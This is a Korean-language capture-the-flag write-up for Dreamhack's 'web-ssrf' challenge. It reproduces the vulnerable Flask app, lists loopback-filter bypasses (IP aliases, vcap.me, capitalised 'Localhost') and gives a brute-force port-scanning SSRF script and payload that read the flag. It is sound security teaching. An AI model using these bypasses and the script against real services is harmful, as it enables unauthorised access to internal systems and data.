# [Dreamhack Wargame] web-ssrf
### [🚩web-ssrf](https://dreamhack.io/wargame/challenges/75/)
  <img width="1071" alt="web-ssrf_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/6a2e729e-08fa-4e6f-ac54-593b24e6190a">

<br/><br/>

## 문제 파일(app.py) 분석
```python
#!/usr/bin/python3
from flask import (
    Flask,
    request,
    render_template
)
import http.server
import threading
import requests
import os, random, base64
from urllib.parse import urlparse

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()  # Flag is here!!
except:
    FLAG = "[**FLAG**]"


# 인덱스 페이지
@app.route("/")
def index():
    return render_template("index.html") # 인덱스 페이지(index.html)를 화면에 출력함



# img_viewer 페이지
@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET": # GET 메소드로 요청 시
        return render_template("img_viewer.html") # 이용자에게 url를 입력받는 페이지(img_viewer.html)를 화면에 출력함
    elif request.method == "POST": # POST 메소드로 요청 시
        url = request.form.get("url", "") # 이용자가 전달한 url를 가져옴
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc): # 주소에 127.0.0.1, localhost가 포함된 URL로 접근하는 것을 차단함 (URL 필터링)
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content # 이용자기 입력한 url에 HTTP 요청을 보내고 응답을 받아옴
            img = base64.b64encode(data).decode("utf8")
        except: # 이용자가 입력한 url에 HTTP 요청을 보내고 응답을 받아오는 것에 실패했을 경우
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img) # img를 img_viewer.html의 인자로 하여 렌더링함



local_host = "127.0.0.1" # 호스트를 127.0.0.1로 설정
local_port = random.randint(1500, 1800) # 포트를 랜덤하게 생성함
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler # 현재 디렉터리를 기준으로 URL이 가리키는 리소스를 반환하는 웹 서버가 생성됨
) # 호스트가 local_host(127.0.0.1)이므로 외부에서 이 서버에 직접 접근하는 것은 불가능함

# run_local_server: 파이썬의 기본 모듈인 http를 이용하여 local_host(127.0.0.1)의 임의 포트에 HTTP 서버를 실행함
def run_local_server():
    local_server.serve_forever()


threading._start_new_thread(run_local_server, ())

app.run(host="0.0.0.0", port=8000, threaded=True)
```

<br/><br/>

## 문제 풀이
### 취약점이 존재하는 부분
img_viewer에서 URL 필터링 부분을 우회하면 SSRF를 통해 내부 HTTP 서버에 접근할 수 있음
* URL 필터링: URL에 포함된 문자열을 검사하여 부적절한 URL로의 접근을 막는 보호 기법
    | 블랙리스트 필터링 | 화이트리스트 필터링 |
    |---|---|
    | URL에 포함되면 안되는 문자열로 블랙리스트를 만들고, 이를 이용하여 이용자가 해당 문자열이 포함된 모든 URL로의 접근을 차단함 (항상 예외가 있을 수 있으므로 유의해야 함) | 접근을 허용할 URL로 화이트리스트를 만들고, 이를 이용하여 이용자가 이외의 URL에 접근하려면 이를 차단함 |

<br/><br/>

### URL 필터링 우회 방법
1. 127.0.0.1과 매핑된 도메인 이름 사용
    - 구매한 도메인 이름을 DNS 서버에 등록하여 원하는 IP 주소와 연결하면, 이후에는 등록된 이름이 IP 주소로 리졸브(resolve)된다는 점을 이용
        + 임의의 도메인 이름을 구매하여 127.0.0.1과 연결하고, 그 이름을 url로 사용하면 필터링 우회 가능
    - 이미 127.0.0.1에 매핑된 ".vcap.me"를 이용하는 방법도 있음

2. 127.0.0.1의 alias 이용
    - 하나의 IP는 여러 가지 방식으로 표기될 수 있음
        | 127.0.0.1 IP 주소 표기 | 예시 |
        |-----|----|
        | 127.0.0.1의 각 자릿수를 16진수로 변환함 | 0x7f.0x00.0x00.0x01 |
        | 0x7f.0x00.0x00.0x01에서 .을 제거함 | 0x7f000001 |
        | 0x7f000001를 10진수로 변환함 | 2130706433 |
        | 127.0.0.1의 각 자리에서 0을 생략함 | 127.1 또는 127.0.1 |

    - 루프백 주소: 127.0.0.1부터 127.0.0.255까지의 IP 주소
        + 모두 로컬 호스트를 가리킴

3. localhost의 alias 이용
    - URL에서 호스트와 스키마는 대소문자를 구분하지 않음 → localhost의 임의 문자를 대문자로 바꿔도 같은 호스트를 의미함


<br/><br/>

### 익스플로잇
1. 내부 서버는 포트 번호가 1500 이상 1800 이하인 임의 포트에서 실행되고 있으므로 포트 번호를 찾는 스크립트(ssrf_port.py)를 작성하여 브루트포스로 포트를 찾음
    ```python
    #!/usr/bin/python3

    import requests
    import sys
    from tqdm import tqdm

    # 'src' value of "NOT FOUND X" (페이지에서 기본적으로 제공하는 /static/dream.png를 입력하면 출력되는 <img> 태그의 src 값의 앞부분)
    NOTFOUND_IMG = "iVBORw0KG"

    def send_img(img_url):
        global chall_url

        data = {
            "url": img_url,
        }
        response = requests.post(chall_url, data=data)

        return response.text


    def find_port():
        for port in tqdm(range(1500, 1801)): # 포트 범위는 1500 이상 1800 이하이므로 반복문을 통해 포트 번호를 찾음
            img_url = f"http://Localhost:{port}"

            if NOTFOUND_IMG not in send_img(img_url): # 응답 결과에 NOTFOUND_IMG가 있으면 false, 없으면 true를 반환함
                print(f"Internal port number is: {port}")
                break

        return port


    if __name__ == "__main__":
        chall_port = int(sys.argv[1]) # 11485 (접속 정보 부분 확인 - 가변적)
        chall_url = f"http://host3.dreamhack.games:{chall_port}/img_viewer"

        internal_port = find_port()
    ```
    - ssrf_port.py 실행 결과 포트 번호 1564 획득
      <img width="736" alt="port_number" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/580902e6-19ba-4e10-9a6d-878aac255dd9">

2. 내부 HTTP 서버는 /app에서 실행되고 있으므로 해당 서버의 flag.txt를 읽기 위해 img_viewer 페이지에서 ```http://Localhost:1564/flag.txt```과 같이 입력하고 View 버튼을 클릭함
    - localhost의 alias를 이용하여 URL 필터링을 우회함 (localhost의 임의 문자를 대문자로 바꿈)
    <img width="922" alt="ssrf_exploit_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/8eb66b07-4ebf-4a47-8cab-4c0228a9b8fc">

3. 화면에 url 이미지(<img> 태그)가 출력되고 이를 크롬 개발자 도구의 Elements 탭에서 확인함
    - base64로 인코딩된 플래그가 src 부분에 존재함
  <img width="1056" alt="ssrf_exploit_3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/a171b0ab-56e9-45e9-ada4-71e4b638951e">

4. base64를 디코딩하면 플래그를 확인할 수 있음 (드림핵 툴즈 서비스의 Cyber Chef를 사용함)
  <img width="1543" alt="ssrf_exploit_4" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/a020b2dc-e1e0-4114-966e-fd875c122361">
